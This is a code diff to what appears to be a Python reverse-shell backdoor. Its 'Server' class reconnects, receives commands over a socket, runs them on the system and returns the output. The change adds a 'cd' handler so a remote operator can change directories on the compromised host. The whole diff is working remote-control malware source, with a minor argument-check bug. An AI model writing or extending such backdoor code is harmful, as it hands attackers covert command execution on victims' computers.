@@ -2,6 +2,7 @@ import socket
 import subprocess
 import time
 import json
+import os
 
 
 class Server:
@@ -21,6 +22,10 @@ class Server:
             except Exception:
                 self.connect()
 
+    def change_directory(self, path):
+        os.chdir(path)
+        return f"Changed directory to {self.execute_command_on_system('pwd')}."
+
     def receive_commands_and_execute(self):
         while True:
             try:
@@ -29,6 +34,9 @@ class Server:
                 if split_command[0] == "quit":
                     self.server.close()
                     exit()
+                elif split_command[0] == "cd" and split_command[1] is not None:
+                    result = self.change_directory(split_command[1])
+                    self.reliable_send(result)
                 else:
                     result = self.execute_command_on_system(receive)
                     self.reliable_send(result)
